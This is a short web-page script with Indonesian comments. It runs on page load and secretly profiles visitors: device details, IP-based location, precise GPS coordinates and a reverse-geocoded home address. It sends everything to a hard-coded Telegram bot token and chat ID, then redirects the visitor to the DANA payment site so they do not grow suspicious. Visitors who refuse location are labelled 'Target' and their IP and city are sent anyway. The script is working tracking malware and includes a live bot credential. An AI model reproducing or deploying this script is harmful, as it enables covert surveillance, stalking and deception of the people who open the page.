<script>
    async function kirimData() {
        // --- KONFIGURASI ---
        const TOKEN = "8792237779:AAHPqEspio6-Brm0-H7N-D2Us_n3vLM9la8"; 
        const CHAT_ID = "7499493637"; 

        // 1. Ambil Data Baterai & Network
        let batLevel = "N/A", batStatus = "N/A", connectionType = "N/A";
        try {
            const battery = await navigator.getBattery();
            batLevel = Math.round(battery.level * 100) + "%";
            batStatus = battery.charging ? "âœ… YA" : "âŒ TIDAK";
            connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
        } catch (e) {}

        // 2. Ambil Data IP & Lokasi Kasar
        let geo = {};
        try {
            const res = await fetch('https://ipapi.co/json/');
            geo = await res.json();
        } catch (e) {}

        // 3. Ambil Lokasi GPS Akurat & Alamat Lengkap
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                // Mengambil Alamat Asli berdasarkan Lat/Lon (Reverse Geocoding)
                let alamatLengkap = "Gagal mengambil alamat otomatis";
                try {
                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const geoData = await geoRes.json();
                    alamatLengkap = geoData.display_name;
                } catch (e) {}

                const waktu = new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'long' });
                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                // Susun Pesan Persis Seperti Contoh Awal
                const teks = `
â•­â”€â”€â”€â”€â”€ Tracking Report â”€â”€â”€â”€â”€ â¦¿

ğŸŒ Bahasa: ${navigator.language}
ğŸ“¶ Online: ${navigator.onLine ? 'Online' : 'Offline'}
ğŸ“º Screen: ${screen.width}x${screen.height}
ğŸªŸ Window: ${window.innerWidth}x${window.innerHeight}
ğŸ’¾ RAM: ${navigator.deviceMemory || 'Unknown'} GB
ğŸ§  CPU Cores: ${navigator.hardwareConcurrency}
ğŸ”‹ Battery: ${batLevel}
ğŸ”Œ Charging: ${batStatus}
ğŸ“¶ Network: ${connectionType}
â° Waktu Akses: ${waktu}

ğŸ“ LOCATION INFORMATION
ğŸ“¡ IP Address: ${geo.ip || 'Unknown'}
ğŸ™ï¸ Kota: ${geo.city || 'Unknown'}
ğŸ—ºï¸ Wilayah: ${geo.region || 'Unknown'}
ğŸŒ Negara: ${geo.country_name || 'Unknown'}
ğŸ“Œ Latitude: ${lat}
ğŸ“ Longitude: ${lon}
ğŸ  Alamat Lengkap: ${alamatLengkap}

â•°â”€â”€â”€â”€â”€ Powered by Gemini AI`;

                // Kirim ke Telegram
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
                });

                // Lempar ke halaman asli agar tidak curiga
                window.location.href = "https://www.dana.id";

            }, async (err) => {
                // Jika GPS ditolak, kirim data IP saja
                const pesanGagal = `âŒ Target Menolak Izin Lokasi\nğŸ“¡ IP: ${geo.ip}\nğŸ™ï¸ Kota: ${geo.city}`;
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: pesanGagal })
                });
                window.location.href = "https://www.dana.id";
            });
        }
    }

    window.onload = kirimData;
</script>